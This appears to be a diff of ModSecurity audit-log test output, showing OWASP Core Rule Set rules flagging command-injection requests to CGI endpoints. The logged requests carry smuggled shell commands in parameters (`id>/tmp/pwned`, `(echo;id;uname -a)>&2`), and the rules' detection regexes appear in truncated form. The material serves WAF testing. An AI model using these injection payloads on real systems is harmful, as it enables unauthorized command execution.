+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?i)(?:;|\{|\||\|\||&|&&|\n|\r|`)\s*[\(,@\'\"\s]*(?:[\w'\"\./]+/|[\\\\'\"\^]*\w[\\\\'\"\^]*:.*\\\\|[\^\.\w '\"/\\\\]*\\\\)?[\"\^]*(?:m[\"\^]*(?:y[\"\^]*s[\"\^]*q[\"\^]*l(?:[\"\^]*(?:d[\"\^]*u[\"\^]*m[ (4978 characters omitted)' against variable `ARGS:hash' (Value: ``(echo;id;uname -a)>&2`' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "237"] [id "932110"] [rev ""] [msg "Remote Command Execution: Windows Command Injection"] [data "Matched Data: `(echo found within ARGS:hash: `(echo;id;uname -a)>&2`"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-windows"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/cgi-bin/userConfig.cgi"] [unique_id "1652108238"] [ref "o0,6v69,23"]
+ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `10' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 10)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/cgi-bin/userConfig.cgi"] [unique_id "1652108238"] [ref ""]
 
----eKNQy68r---I--
+---1oRUsldr---I--
 
----eKNQy68r---J--
+---1oRUsldr---J--
 
----eKNQy68r---Z--
+---1oRUsldr---Z--
 
----ZyKjkKgg---A--
-[08/May/2022:23:00:56 +0200] 1652043656 127.0.0.1 12345 127.0.0.1 80
----ZyKjkKgg---B--
+---YE3GUZBO---A--
+[09/May/2022:16:57:19 +0200] 1652108239 127.0.0.1 12345 127.0.0.1 80
+---YE3GUZBO---B--
 GET /cgi-bin/filemanager/utilRequest.cgi?func=cancel_trash_recovery&sid=SIDVALUE&pid=`id>/tmp/pwned` HTTP/1.1
 Host: localhost
 User-Agent: msc_process_uri
 Accept: */*
 
----ZyKjkKgg---D--
+---YE3GUZBO---D--
 
----ZyKjkKgg---F--
+---YE3GUZBO---F--
 HTTP/1.1 200
 
----ZyKjkKgg---H--
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:;|\{|\||\|\||&|&&|\n|\r|\$\(|\$\(\(|`|\${|<\(|>\(|\(\s*\))\s*(?:{|\s*\(\s*|\w+=(?:[^\s]*|\$.*|\$.*|<.*|>.*|\'.*\'|\".*\")\s+|!\s*|\$)*\s*(?:'|\")*(?:[\?\*\[\]\(\)\-\|+\w'\"\./\\\\]+/)?[\\\\'\"]*(?: (5210 characters omitted)' against variable `ARGS:pid' (Value: ``id>/tmp/pwned`' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "102"] [id "932100"] [rev ""] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: `id>/tmp/pwned found within ARGS:pid: `id>/tmp/pwned`"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/cgi-bin/filemanager/utilRequest.cgi"] [unique_id "1652043656"] [ref "o0,14v85,15"]
-ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `5' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/cgi-bin/filemanager/utilRequest.cgi"] [unique_id "1652043656"] [ref ""]
+---YE3GUZBO---H--
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:;|\{|\||\|\||&|&&|\n|\r|\$\(|\$\(\(|`|\${|<\(|>\(|\(\s*\))\s*(?:{|\s*\(\s*|\w+=(?:[^\s]*|\$.*|\$.*|<.*|>.*|\'.*\'|\".*\")\s+|!\s*|\$)*\s*(?:'|\")*(?:[\?\*\[\]\(\)\-\|+\w'\"\./\\\\]+/)?[\\\\'\"]*(?: (5210 characters omitted)' against variable `ARGS:pid' (Value: ``id>/tmp/pwned`' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "102"] [id "932100"] [rev ""] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: `id>/tmp/pwned found within ARGS:pid: `id>/tmp/pwned`"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/cgi-bin/filemanager/utilRequest.cgi"] [unique_id "1652108239"] [ref "o0,14v85,15"]
+ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `5' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/cgi-bin/filemanager/utilRequest.cgi"] [unique_id "1652108239"] [ref ""]
 
----ZyKjkKgg---I--
+---YE3GUZBO---I--
 
----ZyKjkKgg---J--
+---YE3GUZBO---J--
 
----ZyKjkKgg---Z--
+---YE3GUZBO---Z--
 
